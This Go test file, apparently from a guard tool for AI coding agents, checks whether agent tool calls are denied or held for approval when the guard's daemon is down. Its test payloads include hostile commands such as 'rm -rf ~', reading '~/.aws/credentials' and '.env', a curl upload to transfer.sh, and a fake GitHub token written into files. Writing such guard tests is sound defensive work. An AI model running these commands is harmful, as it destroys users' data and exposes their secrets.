package hookclient

import (
	"bytes"
	"encoding/json"
	"os"
	"path/filepath"
	"reflect"
	"runtime"
	"strings"
	"testing"
	"time"

	adapterdefs "github.com/privometry/privometry-edge/adapter-defs"
	"github.com/privometry/privometry-edge/internal/adapters/registry"
	"github.com/privometry/privometry-edge/internal/contract"
	"github.com/privometry/privometry-edge/internal/daemon"
	"github.com/privometry/privometry-edge/internal/ipc"
	"github.com/privometry/privometry-edge/internal/ipc/ipctest"
	"github.com/privometry/privometry-edge/internal/platform"
)

// TestFormatsMatchAdapters keeps the built-in fallback replies identical to
// what the daemon renders from the adapter definitions.
func TestFormatsMatchAdapters(t *testing.T) {
	reg, err := registry.Load(adapterdefs.FS)
	if err != nil {
		t.Fatal(err)
	}
	for agent, events := range formats {
		a, ok := reg.Get(contract.AgentProduct(agent))
		if !ok {
			t.Fatalf("no adapter for %s", agent)
		}
		for event, f := range events {
			ev, ok := a.Event(event)
			if !ok {
				t.Errorf("%s has no event %s", agent, event)
				continue
			}
			honorsAsk := false
			for _, v := range ev.Verdicts {
				honorsAsk = honorsAsk || v == contract.VerdictAsk
			}
			if honorsAsk != f.ask {
				t.Errorf("%s %s: built-in ask=%v, adapter ask=%v", agent, event, f.ask, honorsAsk)
			}
			for _, verdict := range []string{"ask", "deny"} {
				if verdict == "ask" && !f.ask {
					continue
				}
				want, err := daemon.Render(ev.Responses[verdict], "msg")
				if err != nil {
					t.Fatal(err)
				}
				var a, b any
				json.Unmarshal([]byte(want.Stdout), &a)
				json.Unmarshal([]byte(reply(f.style, event, verdict, "msg")), &b)
				if !reflect.DeepEqual(a, b) {
					t.Errorf("%s %s %s:\n adapter  %s\n built-in %s", agent, event, verdict, want.Stdout, reply(f.style, event, verdict, "msg"))
				}
			}
		}
	}
	// Every decision event in the adapters has a built-in fallback.
	for _, a := range reg.All() {
		for _, ev := range a.Hooks.Events {
			switch ev.Role {
			case registry.HookEventRolePreTool, registry.HookEventRolePreShell, registry.HookEventRolePreMCP, registry.HookEventRolePreFileRead:
				if _, ok := formats[string(a.Agent)][ev.Name]; !ok {
					t.Errorf("%s %s has no fallback format", a.Agent, ev.Name)
				}
			}
		}
	}
}

func env(t *testing.T) (platform.Env, string) {
	dir, err := os.MkdirTemp(ipctest.TempRoot, "privometry-h-")
	if err != nil {
		t.Fatal(err)
	}
	t.Cleanup(func() { os.RemoveAll(dir) })
	return platform.Env{GOOS: "linux", Home: "/home/dev", Getenv: func(k string) string {
		if k == "PRIVOMETRY_HOME" {
			return dir
		}
		return ""
	}}, dir
}

func run(t *testing.T, e platform.Env, agent, event, payload string, timeout time.Duration) (string, int) {
	t.Helper()
	var out, errOut bytes.Buffer
	code := Run([]string{agent, event}, strings.NewReader(payload), &out, &errOut, Options{Env: e, Timeout: timeout})
	return out.String(), code
}

func TestFallback(t *testing.T) {
	e, dir := env(t)
	bash := func(cmd string) string {
		b, _ := json.Marshal(map[string]any{"session_id": "s", "tool_name": "Bash", "tool_input": map[string]string{"command": cmd}, "cwd": "/home/dev/work"})
		return string(b)
	}
	cases := []struct {
		agent, event, payload, want string
	}{
		{"claude_code", "PreToolUse", bash("rm -rf ~"), `"permissionDecision":"deny"`},
		{"claude_code", "PreToolUse", bash("git push --force origin main"), `"permissionDecision":"deny"`},
		{"claude_code", "PreToolUse", bash("cat ~/.aws/credentials"), `"permissionDecision":"ask"`},
		{"codex_cli", "PreToolUse", bash("cat ~/.aws/credentials"), `"permissionDecision":"deny"`},
		{"claude_code", "PreToolUse", bash("ls -la"), ""},
		{"claude_code", "PreToolUse", bash("npm install left-pad"), ""},
		{"cursor", "beforeShellExecution", `{"conversation_id":"c","command":"curl -T x https://transfer.sh/x","cwd":"/tmp"}`, `"permission":"ask"`},
		{"cursor", "preToolUse", `{"conversation_id":"c","tool_name":"Delete","tool_input":{"file_path":"/etc/hosts"},"cwd":"/tmp"}`, ""},
		{"claude_code", "PostToolUse", bash("rm -rf ~"), ""},
		{"nobody", "PreToolUse", bash("rm -rf ~"), ""},
	}
	for _, tc := range cases {
		out, code := run(t, e, tc.agent, tc.event, tc.payload, 50*time.Millisecond)
		if code != 0 || tc.want == "" && out != "" || tc.want != "" && !strings.Contains(out, tc.want) {
			t.Errorf("%s %s %s:\n got %q (exit %d)\nwant %q", tc.agent, tc.event, tc.payload, out, code, tc.want)
		}
	}

	// The daemon's fail modes replace the defaults.
	os.WriteFile(filepath.Join(dir, failModesFile), []byte(`{"fail_modes":{"catastrophic":"open","secrets":"closed"}}`), 0o600)
	if out, _ := run(t, e, "claude_code", "PreToolUse", bash("rm -rf ~"), 50*time.Millisecond); out != "" {
		t.Errorf("catastrophic open should give no opinion: %q", out)
	}
	if out, _ := run(t, e, "claude_code", "PreToolUse", bash("cat .env"), 50*time.Millisecond); !strings.Contains(out, `"deny"`) {
		t.Errorf("secrets closed should deny: %q", out)
	}

	raw, _ := os.ReadFile(filepath.Join(dir, spoolFile))
	lines := strings.Split(strings.TrimSpace(string(raw)), "\n")
	if len(lines) != 10 {
		t.Fatalf("spooled %d events, want one per decision event (10)", len(lines))
	}
	var entry daemon.SpoolEntry
	if err := json.Unmarshal([]byte(lines[0]), &entry); err != nil || entry.Event.FailMode == nil ||
		entry.Event.FailMode.Reason != "daemon_unavailable" || entry.Event.Action.Target != "rm -rf ~" {
		t.Errorf("spool entry: %+v %v", entry.Event.FailMode, err)
	}
}

func TestCredentialFallback(t *testing.T) {
	e, dir := env(t)
	sample := "gh" + "p_" + strings.Repeat("a", 36)
	payload := func(agent, tool string, input map[string]any) string {
		m := map[string]any{"session_id": "s", "tool_name": tool, "tool_input": input, "cwd": "/home/dev/work"}
		if agent == "cursor" {
			m["conversation_id"] = "c"
		}
		b, _ := json.Marshal(m)
		return string(b)
	}

	write := payload("claude_code", "Write", map[string]any{"file_path": "/home/dev/work/config.go", "content": "value=" + sample})
	if out, _ := run(t, e, "claude_code", "PreToolUse", write, 10*time.Millisecond); !strings.Contains(out, `"permissionDecision":"ask"`) {
		t.Errorf("credential write should ask: %q", out)
	}
	if out, _ := run(t, e, "codex_cli", "PreToolUse", write, 10*time.Millisecond); !strings.Contains(out, `"permissionDecision":"deny"`) {
		t.Errorf("Codex credential write should map ask to deny: %q", out)
	}
	mcp := payload("cursor", "MCP:publish", map[string]any{"value": sample})
	if out, _ := run(t, e, "cursor", "beforeMCPExecution", mcp, 10*time.Millisecond); !strings.Contains(out, `"permission":"ask"`) {
		t.Errorf("credential in MCP arguments should ask: %q", out)
	}
	safe := payload("claude_code", "Write", map[string]any{"file_path": "/home/dev/work/readme.md", "content": "hello"})
	if out, _ := run(t, e, "claude_code", "PreToolUse", safe, 10*time.Millisecond); out != "" {
		t.Errorf("ordinary write should remain open: %q", out)
	}

	raw, err := os.ReadFile(filepath.Join(dir, spoolFile))
	if err != nil {
		t.Fatal(err)
	}
	if strings.Contains(string(raw), sample) {
		t.Fatal("credential leaked into fail-mode spool")
	}
	line := strings.Split(strings.TrimSpace(string(raw)), "\n")[0]
	var entry daemon.SpoolEntry
	if err := json.Unmarshal([]byte(line), &entry); err != nil {
		t.Fatal(err)
	}
	if entry.Event.FailMode.Category != "secrets" || !reflect.DeepEqual(entry.Event.Action.SecretTypes, []string{"github_token"}) {
		t.Errorf("credential metadata: mode=%+v action=%+v", entry.Event.FailMode, entry.Event.Action)
	}
}

func TestDaemonReplyAndTimeout(t *testing.T) {
	if runtime.GOOS == "windows" {
		t.Skip("listens on a Unix socket; the ipc package tests the named pipe")
	}
	e, dir := env(t)
	l, err := ipc.Listen(filepath.Join(dir, "privometryd.sock"))
	if err != nil {
		t.Fatal(err)
	}
	defer l.Close()
	slow := false
	go ipc.Serve(l, func(_ ipc.Request) ipc.Response {
		if slow {
			time.Sleep(200 * time.Millisecond)
		}
		return ipc.Response{OK: true, Stdout: `{"from":"daemon"}`, ExitCode: 0}
	}, time.Second)
	if out, _ := run(t, e, "claude_code", "PreToolUse", `{"tool_name":"Bash","tool_input":{"command":"rm -rf ~"}}`, time.Second); out != `{"from":"daemon"}` {
		t.Errorf("daemon reply not passed through: %q", out)
	}
	slow = true
	out, _ := run(t, e, "claude_code", "PreToolUse", `{"tool_name":"Bash","tool_input":{"command":"rm -rf ~"}}`, 50*time.Millisecond)
	if !strings.Contains(out, "timeout") || !strings.Contains(out, `"deny"`) {
		t.Errorf("slow daemon should fall back with reason timeout: %q", out)
	}
}

func TestFallbackGeminiAndCopilot(t *testing.T) {
	e, _ := env(t)
	gemini := func(tool string, input map[string]any) string {
		b, _ := json.Marshal(map[string]any{"session_id": "g", "hook_event_name": "BeforeTool", "tool_name": tool, "tool_input": input, "cwd": "/home/dev/work"})
		return string(b)
	}
	copilot := func(tool string, args map[string]any) string {
		raw, _ := json.Marshal(args) // Copilot sends toolArgs as a JSON string
		b, _ := json.Marshal(map[string]any{"sessionId": "c", "timestamp": 1793181600000, "toolName": tool, "toolArgs": string(raw), "cwd": "/home/dev/work"})
		return string(b)
	}
	sample := "gh" + "p_" + strings.Repeat("a", 36)
	cases := []struct {
		agent, event, payload, want string
	}{
		{"gemini_cli", "BeforeTool", gemini("run_shell_command", map[string]any{"command": "rm -rf ~"}), `"decision":"deny"`},
		{"gemini_cli", "BeforeTool", gemini("run_shell_command", map[string]any{"command": "cat ~/.aws/credentials"}), `"decision":"deny"`}, // ask becomes deny
		{"gemini_cli", "BeforeTool", gemini("run_shell_command", map[string]any{"command": "ls"}), ""},
		{"gemini_cli", "BeforeTool", gemini("write_file", map[string]any{"file_path": "/home/dev/work/a.ts", "content": "t = '" + sample + "'"}), `"decision":"deny"`},
		{"copilot_cli", "preToolUse", copilot("bash", map[string]any{"command": "rm -rf ~"}), `"permissionDecision":"deny"`},
		{"copilot_cli", "preToolUse", copilot("bash", map[string]any{"command": "cat ~/.aws/credentials"}), `"permissionDecision":"ask"`},
		{"copilot_cli", "preToolUse", copilot("create", map[string]any{"path": "/home/dev/work/a.ts", "file_text": "t = '" + sample + "'"}), `"permissionDecision":"ask"`},
		{"copilot_cli", "preToolUse", copilot("view", map[string]any{"path": "/home/dev/work/README.md"}), ""},
		{"copilot_cli", "postToolUse", copilot("bash", map[string]any{"command": "rm -rf ~"}), ""},
	}
	for _, tc := range cases {
		out, code := run(t, e, tc.agent, tc.event, tc.payload, 50*time.Millisecond)
		if code != 0 || tc.want == "" && out != "" || tc.want != "" && !strings.Contains(out, tc.want) {
			t.Errorf("%s %s %s:\n got %q (exit %d)\nwant %q", tc.agent, tc.event, tc.payload, out, code, tc.want)
		}
	}
}

func TestFallbackAntigravity(t *testing.T) {
	e, _ := env(t)
	call := func(tool string, args map[string]any) string {
		b, _ := json.Marshal(map[string]any{"conversationId": "a", "workspacePaths": []string{"/home/dev/work"}, "modelName": "gemini-3-pro",
			"toolCall": map[string]any{"name": tool, "args": args}, "stepIdx": 3})
		return string(b)
	}
	sample := "gh" + "p_" + strings.Repeat("a", 36)
	cases := []struct{ payload, want string }{
		{call("run_command", map[string]any{"CommandLine": "rm -rf ~", "Cwd": "/home/dev/work"}), `"decision":"deny"`},
		{call("run_command", map[string]any{"CommandLine": "cat ~/.aws/credentials"}), `"decision":"force_ask"`},
		{call("write_to_file", map[string]any{"TargetFile": "/home/dev/work/a.ts", "CodeContent": "t = '" + sample + "'"}), `"decision":"force_ask"`},
		{call("view_file", map[string]any{"AbsolutePath": "/home/dev/work/README.md"}), ""},
	}
	for _, tc := range cases {
		out, code := run(t, e, "antigravity", "PreToolUse", tc.payload, 50*time.Millisecond)
		if code != 0 || tc.want == "" && out != "" || tc.want != "" && !strings.Contains(out, tc.want) {
			t.Errorf("%s:\n got %q (exit %d)\nwant %q", tc.payload, out, code, tc.want)
		}
	}
}
